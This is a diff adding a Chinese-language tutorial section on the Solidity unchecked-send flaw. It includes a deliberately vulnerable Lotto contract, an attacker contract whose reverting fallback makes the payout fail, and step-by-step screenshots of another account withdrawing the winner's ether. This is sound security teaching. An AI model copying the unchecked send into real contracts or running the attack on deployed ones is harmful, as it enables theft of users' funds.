@@ -3801,6 +3801,90 @@ contract Test {
 
 ![](pic/blockchain/call_fallback.png)
 
+#### send 转账失败
+
+> 合约 `Lotto` 中，假设通过 `setWinner` 设置中奖者地址，正常情况下，任何人可以帮助中奖者兑奖 `sendToWinner`，并且取出剩余的少数以太坊。
+
+````javascript
+pragma solidity ^0.4.24;
+
+contract Lotto {
+
+    bool public payedOut = false;
+    address public winner;
+    uint256 public winAmount;
+    
+    constructor() public payable {
+        //
+    }
+    
+    // 辅助函数，此处用来设置中奖者地址
+    function setWinner(address _winner) public payable {
+        winner = _winner;
+        winAmount = msg.value;
+    }
+
+    function sendToWinner() public {
+        require(!payedOut);
+        winner.send(winAmount);
+        payedOut = true;
+    }
+
+    function withdrawLeftOver() public {
+        require(payedOut);
+        msg.sender.send(address(this).balance);
+    }
+}
+
+contract Test {
+    Lotto public target_;
+
+    constructor(address _target)  public payable {
+        target_ = Lotto(_target);
+    }
+
+    function test() public payable {
+        target_.sendToWinner();
+    }
+    
+    function () public payable {
+        revert();
+    }
+}
+````
+
+**存在的问题：**合约 `Lotto` 中，给中奖者兑奖时，未检查 `send` 转账函数的返回值，即使 `send` 失败，仍然会将是否已兑奖的标识 `payOut` 置位，继而窃取剩余的大量的原来属于中奖者的以太坊。
+
+详细的攻击过程如下：
+
+使用账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 部署合约 `Lotto`
+
+![](pic/blockchain/deploy_lotto.png) 
+
+- 使用账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 部署合约 `Test`
+
+![](pic/blockchain/deploy_test2.png)
+
+- 设置合约 `Test` 为中奖者，并存入 5 个以太坊
+
+![](pic/blockchain/set_winner.png)
+
+- 切换账户 `0x14723a09acff6d2a60dcdf7aa4aff308fddc160c` 给中奖者兑奖
+
+![](pic/blockchain/send_to_winner.png)
+
+此时兑奖失败，却标记为已兑奖
+
+![](pic/blockchain/send_to_winner2.png)
+
+- 使用账户 `0x14723a09acff6d2a60dcdf7aa4aff308fddc160c` 窃取剩余的大量的原来属于中奖者的以太坊
+
+![](pic/blockchain/withdraw_left_over.png)
+
+![](pic/blockchain/withdraw_left_over2.png)
+
+此时，账户余额变为 105 以太坊。
+
 ## 比特币
 
 ### 密钥和地址
